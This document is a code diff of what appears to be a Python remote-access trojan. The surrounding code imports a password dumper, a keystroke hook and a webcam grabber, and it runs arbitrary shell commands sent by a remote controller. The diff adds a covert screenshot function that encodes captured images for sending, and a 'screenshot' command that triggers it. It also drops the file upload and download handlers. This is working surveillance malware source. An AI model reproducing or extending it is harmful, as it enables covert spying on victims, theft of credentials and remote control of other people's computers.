@@ -16,6 +16,7 @@ import ctypes
 import sys
 import string
 import vidcap
+import StringIO
 
 if os.name == "nt":
 	import passdump
@@ -24,6 +25,7 @@ if os.name == "nt":
 	import win32con
 	import pyHook
 	import pythoncom
+	import pyscreenshot
 	
 if sys.stdout.isatty():
 	logging.basicConfig(level=logging.DEBUG, format="%(asctime)s %(levelname)s in %(funcName)s: %(message)s")
@@ -357,14 +359,6 @@ class Transport:
 				self.create_channel(signal.split(":")[1])
 			elif signal.startswith("CREATE_PROXY"):
 				ProxyConnection(self.channels[signal.split(":")[1]])
-			elif signal.startswith("DOWNLOAD_FILE"):
-				junk, channel, file = signal.split(":")
-				channel = self.channels[channel]
-				fs.download(file, channel)
-			elif signal.startswith("UPLOAD_FILE"):
-				junk, channel, file = signal.split(":")
-				channel = self.channels[channel]
-				fs.upload(file, channel)
 				
 	def create_channel(self, id):
 		self.channels[id] = Channel(id, self.master_queue)
@@ -650,6 +644,18 @@ class Information_Gathering:
 		buffer, width, height = cam.getbuffer()
 		return base64.b64encode(buffer)+"|"+str(width)+"|"+str(height)+"|"
 		
+	@windows_only
+	def take_screenshot(self):
+		try:
+			img = pyscreenshot.grab(childprocess=False)
+			img_data = img.tobytes()
+			width, height = img.size
+			
+			return base64.b64encode(img_data)+"|"+str(width)+"|"+str(height)+"|"
+		except Exception as e:
+			return "A|1|1|"
+		
+		
 class Networking:
 	"""
 	Network discovery, port scans, etc.
@@ -857,6 +863,9 @@ help - This menu!
 					output = "why"
 				else:
 					output = info.uictl(action, what)
+					
+			elif data == "screenshot":
+				output = info.take_screenshot()
 
 			else:
 				output = execute.execute_shell_command(data)[1]
